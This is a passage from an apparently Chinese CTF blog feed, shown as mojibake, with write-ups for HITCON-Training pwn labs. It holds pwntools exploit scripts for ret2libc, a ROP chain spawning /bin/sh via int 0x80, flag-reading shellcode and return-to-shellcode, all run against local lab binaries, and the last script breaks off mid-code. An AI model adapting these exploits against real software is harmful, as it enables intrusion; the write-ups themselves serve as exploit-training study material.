class="lazyload"></p><p>å¯ä»¥çœ‹åˆ°paddingé•¿åº¦ä¸º60ï¼Œæ¥ä¸‹æ¥å†™expå³å¯.</p></blockquote><h3 id="æ„é€ exp"><a href="#æ„é€ exp" class="headerlink" title="æ„é€ exp"></a>æ„é€ exp</h3><blockquote><p>libcbase_addr = puts_addr - libc_puts</p><p>system_addr = libcbase_addr + libc.symbols[â€˜systemâ€™]</p><p>return_addr = â€˜anythingâ€™</p><p>exp:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2lib"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./ret2lib"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/i386-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>libc_puts <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">" :"</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">" : "</span><span class="token punctuation">)</span>libcbase_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc_putsreturn_addr <span class="token operator">=</span> <span class="token number">0x0804857D</span> <span class="token comment" spellcheck="true">#mainå‡½æ•°åœ°å€</span>success<span class="token punctuation">(</span><span class="token string">"libcbase_addr -> {:#x}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libcbase_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libcbase_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>cyclic<span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">,</span> system_addr<span class="token punctuation">,</span> return_addr<span class="token punctuation">,</span> next<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"sh\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sh\x00æ˜¯å› ä¸ºå¯èƒ½åŒ¹é…åˆ°å…¶ä»–å­—ç¬¦ä¸²ï¼Œä»è€ŒåŠ ä¸ªæˆªæ–­</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">" :"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p>è¿è¡Œæ•ˆæœï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd01b3e9b344.png" class="lazyload"></p><h2 id="lab5-simplerop"><a href="#lab5-simplerop" class="headerlink" title="lab5-simplerop"></a>lab5-simplerop</h2><blockquote><p>simplerop ==&gt; easyrop ==&gt; babyrop?ç»å†ç»æœ›çš„è¿‡ç¨‹ğŸ˜­ï¼Œåˆæ˜¯ä¸€ä¸ªæ„é€ ropchainçš„é¢˜ç›®ã€‚</p></blockquote><h3 id="æ£€æŸ¥ä¿æŠ¤æªæ–½-1"><a href="#æ£€æŸ¥ä¿æŠ¤æªæ–½-1" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æ£€æŸ¥ä¿æŠ¤æªæ–½</h3><blockquote><p><code>checksec ./simplerop</code></p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd02cfbed61f.png" class="lazyload"></p><p>å¼€å¯äº†NXï¼Œæ ˆä¸å¯æ‰§è¡Œé˜²æŠ¤ã€‚</p></blockquote><h3 id="é€»è¾‘åˆ†æ-1"><a href="#é€»è¾‘åˆ†æ-1" class="headerlink" title="é€»è¾‘åˆ†æ"></a>é€»è¾‘åˆ†æ</h3><blockquote><p>é€šè¿‡idaçœ‹çœ‹ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd037bdc39d0.png" class="lazyload"></p><p>é€»è¾‘ååˆ†ç®€å•ï¼Œå°±æº¢å‡ºç„¶åæ„é€ rop chainï¼Œé€šè¿‡gdbåŠ¨æ€è°ƒè¯•å¾—åˆ°æº¢å‡ºç‚¹ï¼Œpaddingä¸º32ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd0380835b4e.png" class="lazyload"></p><p>ä½†æ˜¯è¿™ä¸ªé¢˜å‹è²Œä¼¼å«ï¼š<code>ret2systemcall</code>ï¼Œæ­¤ç¨‹åºä¸­æ—¢æ— systemå‡½æ•°ï¼Œä¹Ÿæ— /bin/shå­—ç¬¦ä¸²ï¼Œè¿˜æ˜¯é™æ€ç¼–è¯‘ï¼Œæ–°å§¿åŠ¿ ==&gt;rop chainå int 0x80ä¸­æ–­ä»è€Œæ‰§è¡Œç³»ç»Ÿè°ƒç”¨==&gt; <code>execve(/bin/sh)</code>ã€‚</p><p><strong>åŸç†ï¼šé€šè¿‡ä¸€ç³»åˆ— pop|ret ç­‰gadgetï¼Œä½¿å¾— eax = 0xbï¼ˆexecve 32 ä½ä¸‹çš„ç³»ç»Ÿè°ƒç”¨å·ï¼‰ï¼Œebx -&gt; /bin/shï¼Œ ecx = edx = 0ï¼Œç„¶åé€šè¿‡ <code>int 0x80</code> å®ç°ç³»ç»Ÿè°ƒç”¨ï¼Œæ‰§è¡Œ execve(â€œ/bin/shâ€, 0, 0)</strong></p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd03efc07ec3.png" class="lazyload"></p></blockquote><p>ä¸çŸ¥é“ä¸ºå•¥æˆ‘çš„ROPgadgetæŸ¥ä¸åˆ°æˆ‘ä»¬æƒ³è¦çš„gadgetã€‚</p><h3 id="æ„é€ exp-1"><a href="#æ„é€ exp-1" class="headerlink" title="æ„é€ exp"></a>æ„é€ exp</h3><blockquote><p>exp:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>  p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./simplerop'</span><span class="token punctuation">)</span>  elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./simplerop'</span><span class="token punctuation">)</span>  pop_edx_ecx_ebx <span class="token operator">=</span> <span class="token number">0x0806eca0</span>  pop_eax <span class="token operator">=</span> <span class="token number">0x080b7e26</span>  pop_edx <span class="token operator">=</span> <span class="token number">0x0806ec7a</span>  int_80 <span class="token operator">=</span> <span class="token number">0x0806c8f5</span>  gadget <span class="token operator">=</span> <span class="token number">0x080707b9</span> <span class="token comment" spellcheck="true"># mov word ptr [edx],eax  </span>bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>  read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>  p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>  payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">32</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_edx<span class="token punctuation">)</span> <span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_eax<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">"/bin"</span><span class="token operator">+</span> p32<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span>  payload <span class="token operator">+=</span>  p32<span class="token punctuation">(</span>pop_edx<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_eax<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/sh\x00"</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span>  payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edx_ecx_ebx<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_eax<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xb</span><span class="token punctuation">)</span>  payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>int_80<span class="token punctuation">)</span>  p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p>è¿è¡Œæ•ˆæœï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd043f350073.png" class="lazyload"></p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>å†…å®¹æ¶‰åŠ: libcæ³„éœ²ï¼Œleak libcåŸºåœ°å€ï¼Œropchainç³»ç»Ÿè°ƒç”¨ï¼ˆint 0x80ï¼‰ã€‚</p><p>ropchainç³»ç»Ÿè°ƒç”¨åŸç†ï¼šåœ¨æ— systemå‡½æ•°ï¼Œ/bin/shå¯ç”¨çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡ä¸€ç³»åˆ— pop|ret ç­‰gadgetï¼Œä½¿å¾— eax = 0xbï¼ˆexecve 32 ä½ä¸‹çš„ç³»ç»Ÿè°ƒç”¨å·ï¼‰ï¼Œebx -&gt; /bin/shï¼Œ ecx = edx = 0ï¼Œç„¶åé€šè¿‡ <code>int 0x80</code> å®ç°ç³»ç»Ÿè°ƒç”¨ï¼Œæ‰§è¡Œ execve(â€œ/bin/shâ€, 0, 0)ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> äºŒè¿›åˆ¶å®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-10æœˆ23-Hitcon(ä¸€)</title>
      <link href="/2018/10/23/Pwn-10%E6%9C%8823-Hitcon-%E4%B8%80/"/>
      <url>/2018/10/23/Pwn-10%E6%9C%8823-Hitcon-%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="Pwn-10æœˆ23-Hitcon-ä¸€"><a href="#Pwn-10æœˆ23-Hitcon-ä¸€" class="headerlink" title="Pwn-10æœˆ23-Hitcon(ä¸€)"></a>Pwn-10æœˆ23-Hitcon(ä¸€)</h1><blockquote><p>ç»§ç»­äºŒè¿›åˆ¶ä¿®ç‚¼ï¼Œä»Šå¤©å¼€å§‹è‚Hiton-trainingï¼Œè†œç€<a href="https://m4x.fun/post/hitcon-training-writeup/" target="_blank" rel="noopener">m4x</a>ï¼Œä»¥åŠå¦ä¸€ä½å¤§ä½¬<a href="https://www.jianshu.com/p/2cae38284bff" target="_blank" rel="noopener">23R3F</a>çš„é¢˜è§£è¹’è·šå‰è¡Œã€‚</p></blockquote><h2 id="lab1-sysmagic"><a href="#lab1-sysmagic" class="headerlink" title="lab1-sysmagic"></a>lab1-sysmagic</h2><blockquote><p>è²Œä¼¼ç¬¬ä¸€é¢˜ä¼šæ¯”è¾ƒç®€å•ï¼Œå…ˆç”¨IDA-Proé™æ€åˆ†æä¸€ä¸‹ï¼š</p><p><img src="https://i.loli.net/2018/10/23/5bcf0b64c261c.png" alt=""></p><p>è²Œä¼¼ç›´æ¥å¾—åˆ°äº†ä¸€ä¸ªèƒ½å¤Ÿè¾“å‡ºflagçš„å‡½æ•°ï¼Ÿç”±äºè¿™æ˜¯ä¸ªelf32ä½å¯æ‰§è¡Œæ–‡ä»¶æ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨linuxä¸‹é¢æ‰§è¡Œï¼š</p><p><img src="https://i.loli.net/2018/10/23/5bcf0332abc98.png" alt=""></p><p>å¯ä»¥å¾ˆç®€å•å°±çœ‹æ‡‚é€»è¾‘ï¼Œè¾“å…¥ä¸€ä¸ªå€¼ï¼Œç„¶åæ¯”è¾ƒå¦‚æœç›¸ç­‰ï¼Œå¾—å‡ºflagã€‚</p></blockquote><h3 id="è§£æ³•1-patch"><a href="#è§£æ³•1-patch" class="headerlink" title="è§£æ³•1 - patch"></a>è§£æ³•1 - patch</h3><blockquote><p>IDA Pro â€“ keypatchï¼Œä½¿ç”¨<code>keypatch</code>æ’ä»¶æ¥ä¿®æ”¹æ±‡ç¼–ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å°†å…³é”®çš„ä¸€æ­¥nopæ‰æˆ–è€…æ”¹æˆå®Œå…¨ç›¸åçš„æ“ä½œã€‚</p></blockquote><p><img src="https://i.loli.net/2018/10/23/5bcf05f6b8d06.png" alt=""></p><blockquote><p>ä¾‹å¦‚å°†<code>.text:08048722</code>çš„è·³è½¬æ±‡ç¼–æŒ‡ä»¤æ”¹ä¸ºjmpæ— æ¡ä»¶è·³è½¬ï¼Œæˆ–è€…æ˜¯ä¸jnzç›¸åçš„jzæ“ä½œã€‚</p><p><img src="https://i.loli.net/2018/10/23/5bcf075963ea4.png" alt=""></p><p><img src="https://i.loli.net/2018/10/23/5bcf07b5548dc.png" alt=""></p><p>ä¿®æ”¹ä¸ºæ— æ¡ä»¶è·³è½¬åéœ€è¦å°†å…¶ä¿å­˜åˆ°å¯¹åº”æ–‡ä»¶ä¸­ï¼š<br><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf07f4c58d9.png" class="lazyload"></p><p>ç„¶åå»æŠŠæ–‡ä»¶æŒªåˆ°linuxä¸Šè¿è¡Œè¯•è¯•å‘ç°å¹¶æ²¡æœ‰ç”¨ï¼Œå› ä¸ºæ”¹ä¸ºjmpåå…¶å‡½æ•°ç›´æ¥å°‘äº†ä¸€éƒ¨åˆ†å¯¹flagçš„æ“ä½œï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf0a2f45481.png" class="lazyload"></p><p>æ‰€ä»¥æˆ‘ä»¬åªèƒ½å°†åŸæ ·æœ¬ä¸­çš„jnzæ”¹ä¸ºjzäº†ï¼Œæ”¹å®Œä¹‹åå‡½æ•°å·²ç»æˆä¸ºä¸ç­‰åˆ™è¾“å‡ºflagäº†ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf0bd4dce1d.png" class="lazyload"></p><p>è¿è¡Œæ•ˆæœï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf0c1461b1f.png" class="lazyload"></p></blockquote><h3 id="è§£æ³•2-gdb-set-register-value"><a href="#è§£æ³•2-gdb-set-register-value" class="headerlink" title="è§£æ³•2 - gdb set register value"></a>è§£æ³•2 - gdb set register value</h3><blockquote><p>é€šè¿‡gdbåŠ¨æ€è°ƒè¯•ï¼Œå¹¶ä¸”åœ¨å³å°†è¿›è¡Œæ¯”è¾ƒå‰ï¼Œå°† eaxç½®ä¸ºä¸edxç›¸åŒçš„å€¼å³å¯ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf0e78806d2.png" class="lazyload"></p><p>ç„¶åå³å¯å¾—åˆ°flagã€‚</p></blockquote><h2 id="lab2-orw"><a href="#lab2-orw" class="headerlink" title="lab2-orw"></a>lab2-orw</h2><h3 id="æ£€æŸ¥ä¿æŠ¤æªæ–½"><a href="#æ£€æŸ¥ä¿æŠ¤æªæ–½" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æ£€æŸ¥ä¿æŠ¤æªæ–½</h3><blockquote><p><code>checksec orw.bin</code>ï¼Œé¢˜ç›®orwçš„æ„æ€æ˜¯openï¼Œreadï¼Œwriteè¿™ä¸‰ä¸ªå‡½æ•°ã€‚</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf0fca60256.png" class="lazyload"></p><p>emmmè¿™æ˜¯æˆ‘åšçš„ç¬¬ä¸€ä¸ªå¼€å¯äº†Stackä¿æŠ¤çš„é¢˜ç›®å‘¢ã€‚</p></blockquote><h3 id="é€»è¾‘åˆ†æ"><a href="#é€»è¾‘åˆ†æ" class="headerlink" title="é€»è¾‘åˆ†æ"></a>é€»è¾‘åˆ†æ</h3><blockquote><p>ç®€å•è·‘ä¸€ä¸‹å¯ä»¥çœ‹åˆ°ç›´æ¥æ˜¯è®©ä½ è¾“å…¥shellcodeï¼š<br><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf104eea350.png" class="lazyload"></p><p>æ”¾IDA proé‡Œé¢çœ‹çœ‹ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf15e2dd0aa.png" class="lazyload"></p><p>ç»†çœ‹ä¸€ä¸‹<code>orw_seccomp()å‡½æ•°</code>:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf16ed762fb.png" class="lazyload"></p><p>prctlå‡½æ•°åˆæ˜¯å•¥ç©æ„å„¿ï¼ŸPrctl(ç”¨æˆ·å’Œå†…æ ¸æ²Ÿé€šçš„ä¸€ä¸ªç»ä½³å‡½æ•°),è¿™ä¸ªå‡½æ•°å¯ä»¥å¯¹è¿›ç¨‹è¿›è¡Œä¸€äº›è®¾ç½®ã€‚<a href="https://bbs.pediy.com/thread-225488.htm" target="_blank" rel="noopener">è€Œæœ‰ä¸€é“å¼ºç½‘æ¯é¢˜ç›®å°±å¥½åƒç”¨äº†è¿™ç©æ„å„¿çš„æŠ€æœ¯ï¼Ÿ</a></p><p>è¾“å…¥shellcodeä¹‹ååº”è¯¥ä¼šæ‰§è¡Œï¼Œæ‰€ä»¥è¿™é¢˜çš„ç›®çš„æ˜¯è®©æˆ‘ä»¬è‡ªå·±æ„é€ shellcodeå»è¯»å–flagï¼Ÿæ—¢ç„¶è¦æ„é€ shellcodeï¼Œé‚£å°±éœ€è¦ç”¨åˆ°pwntoolsçš„asmæ¨¡å—å’Œshellcraftæ¨¡å—ï¼š</p><p>asmæ¨¡å—æ˜¯å°†æ“ä½œè½¬æ¢ä¸ºæ±‡ç¼–å‘½ä»¤ï¼Œè€Œshellcraftæ˜¯å…·æœ‰å„ç§å‡½æ•°å¯¹åº”æ±‡ç¼–å‘½ä»¤çš„ä¸€ä¸ªæ¨¡å—ï¼Œååˆ†å¥½ç”¨ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf1996469a4.png" class="lazyload"></p><p>pwntoolsä¸­çš„contextæ¨¡å—åˆæ˜¯ç”¨æ¥å¹²å˜›çš„å‘¢ï¼Ÿ</p><p><code>context</code>æ˜¯pwntoolsç”¨æ¥è®¾ç½®ç¯å¢ƒçš„åŠŸèƒ½ã€‚åœ¨å¾ˆå¤šæ—¶å€™ï¼Œç”±äºäºŒè¿›åˆ¶æ–‡ä»¶çš„æƒ…å†µä¸åŒï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦è¿›è¡Œä¸€äº›ç¯å¢ƒè®¾ç½®æ‰èƒ½å¤Ÿæ­£å¸¸è¿è¡Œexpï¼Œæ¯”å¦‚æœ‰ä¸€äº›éœ€è¦è¿›è¡Œæ±‡ç¼–ï¼Œä½†æ˜¯32çš„æ±‡ç¼–å’Œ64çš„æ±‡ç¼–ä¸åŒï¼Œå¦‚æœä¸è®¾ç½®contextä¼šå¯¼è‡´ä¸€äº›é—®é¢˜ã€‚</p><p>ä¾‹å¦‚<code>context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)</code></p><p>è¿™å¥è¯çš„æ„æ€æ˜¯ï¼š </p><ol><li>osè®¾ç½®ç³»ç»Ÿä¸ºlinuxç³»ç»Ÿï¼Œåœ¨å®Œæˆctfé¢˜ç›®çš„æ—¶å€™ï¼Œå¤§å¤šæ•°pwné¢˜ç›®çš„ç³»ç»Ÿéƒ½æ˜¯linux </li><li>archè®¾ç½®æ¶æ„ä¸ºamd64ï¼Œå¯ä»¥ç®€å•çš„è®¤ä¸ºè®¾ç½®ä¸º64ä½çš„æ¨¡å¼ï¼Œå¯¹åº”çš„32ä½æ¨¡å¼æ˜¯â€™i386â€™ </li><li>log_levelè®¾ç½®æ—¥å¿—è¾“å‡ºçš„ç­‰çº§ä¸ºdebugï¼Œè¿™å¥è¯åœ¨è°ƒè¯•çš„æ—¶å€™ä¸€èˆ¬ä¼šè®¾ç½®ï¼Œè¿™æ ·pwntoolsä¼šå°†å®Œæ•´çš„ioè¿‡ç¨‹éƒ½æ‰“å°ä¸‹æ¥ï¼Œä½¿å¾—è°ƒè¯•æ›´åŠ æ–¹ä¾¿ï¼Œå¯ä»¥é¿å…åœ¨å®ŒæˆCTFé¢˜ç›®æ—¶å‡ºç°ä¸€äº›å’ŒIOç›¸å…³çš„é”™è¯¯ã€‚</li></ol></blockquote><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>æ ¹æ®é¢˜æ„å’Œé¢˜è§£ğŸ˜‚ï¼ˆæ­£å¤„äºæ¶¨å§¿åŠ¿çš„æ—¶å€™ï¼‰å†™å‡ºexpï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> shellcraft <span class="token keyword">as</span> sccontext<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>shellcode <span class="token operator">=</span> sc<span class="token punctuation">.</span>pushstr<span class="token punctuation">(</span><span class="token string">"/home/xiaoyifeng/ctf/pwn/Hiton/lab2/flag"</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> sc<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">"esp"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#  openè¿”å›çš„æ–‡ä»¶æ–‡ä»¶æè¿°ç¬¦å­˜è´®åœ¨eaxå¯„å­˜å™¨é‡Œ </span>shellcode <span class="token operator">+=</span> sc<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">"eax"</span><span class="token punctuation">,</span> <span class="token string">"esp"</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#  openè¯»å–çš„å†…å®¹æ”¾åœ¨æ ˆé¡¶ </span><span class="token comment" spellcheck="true">#  writeå‡½æ•°åœ¨æ ˆé¡¶è¯»å–0x100å¤§å°çš„å†…å®¹å¹¶æ‰“å°å‡ºæ¥</span>shellcode <span class="token operator">+=</span> sc<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"esp"</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./orw.bin"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print(asm(shellcode))</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"shellcode:"</span><span class="token punctuation">,</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>è¿è¡Œæ•ˆæœï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf2cbec3db2.png" class="lazyload"></p><h2 id="lab3-ret2sc"><a href="#lab3-ret2sc" class="headerlink" title="lab3-ret2sc"></a>lab3-ret2sc</h2><blockquote><p>é¢˜ç›®åæ˜¯return to shellcodeçš„ç®€å†™ï¼Œåº”è¯¥æ˜¯åˆ©ç”¨returnè¿”å›ç„¶åæ‰§è¡Œshellcodeä¹‹ç±»çš„æ“ä½œï¼Ÿ</p></blockquote><h3 id="æ£€æŸ¥ä¿æŠ¤æªæ–½-1"><a href="#æ£€æŸ¥ä¿æŠ¤æªæ–½-1" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æ£€æŸ¥ä¿æŠ¤æªæ–½</h3><blockquote><p><code>checksec ret2sc</code></p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf21774fa88.png" class="lazyload"></p><p>emmmæ²¡æœ‰å¼€å¯å•¥ä¿æŠ¤ï¼Œæ²¡æœ‰å¼€å¯æ ˆæº¢å‡ºæ£€æµ‹ï¼Œä¹Ÿæ²¡æœ‰å¼€å¯æ ˆä¸å¯æ‰§è¡Œï¼ˆNXï¼‰ã€‚</p></blockquote><h3 id="é€»è¾‘åˆ†æ-1"><a href="#é€»è¾‘åˆ†æ-1" class="headerlink" title="é€»è¾‘åˆ†æ"></a>é€»è¾‘åˆ†æ</h3><blockquote><p>è·‘ä¸€ä¸‹å‘ç°è®©æˆ‘ä»¬è¾“å…¥å­—ç¬¦ä¸²åˆ°Nameé‡Œé¢ï¼Œè¿˜æœ‰ä¸€ä¸ªtry your bestï¼Ÿé¦–å…ˆæƒ³åˆ°çš„æ˜¯ä¼šä¸ä¼šåˆæ˜¯å•¥æ ˆæº¢å‡ºä»€ä¹ˆçš„ã€‚</p></blockquote><blockquote><p> <img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf212fdd23f.png" class="lazyload"></p></blockquote><blockquote><p>å—¯ï¼Œæƒ…å†µæ˜¯æœ‰çš„ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf22016964b.png" class="lazyload"></p><p>é€šè¿‡gdbåŠ¨æ€è°ƒè¯•å¯ä»¥å‘ç°åœ¨è¾“å…¥try your best çš„å€¼çš„æ—¶å€™å¯ä»¥å‘ç”Ÿæº¢å‡ºï¼Œå¹¶ä¸”å°†EIPæŒ‡å‘æˆ‘ä»¬æ„é€ çš„ä½ç½®ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf25189cf77.png" class="lazyload"></p><p>è€Œè¿™ä¸ªä¸´ç•Œå€¼æˆ‘ä»¬å¯ä»¥é€šè¿‡pattern searchæ¥æŸ¥æˆ‘ä»¬æ„é€ çš„patternåç§»é‡ï¼Œå¾—åˆ°ä¸º32ã€‚æ ¹æ®å¤§ä½¬çš„é¢˜è§£äº†è§£åˆ°return to shellcodeæ˜¯ä¸€ç§é¢˜å‹ï¼Œæˆ‘ç”šè‡³æƒ³åˆ°äº†åˆç”¨ROP chain???<code>é»‘äººé—®å·.jpg</code>ğŸ˜­ã€‚</p><p>åŸæ¥return to shellcodeçš„æ“ä½œå°±æ˜¯å°†shellcodeå†™å…¥nameå˜é‡ç©ºé—´ï¼Œç„¶åé€šè¿‡è¿”å›åˆ°è¯¥åœ°å€ä»è€Œæ‰§è¡Œshellcode(NXæœªå¼€å¯ï¼Œæ ˆå¯æ‰§è¡Œ)</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf2a86e5630.png" class="lazyload"></p><p>è¯¥å˜é‡åœ°å€ä¸º0x804A060</p></blockquote><h3 id="æ„é€ EXP"><a href="#æ„é€ EXP" class="headerlink" title="æ„é€ EXP"></a>æ„é€ EXP</h3><blockquote><p>è¿™ä¸ªexpéœ€è¦ç”¨åˆ°shellcraftå’Œasmï¼Œæ¥å°†shellcodeè½¬ä¸ºæ±‡ç¼–æŒ‡ä»¤ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">"linux"</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">"i386"</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token 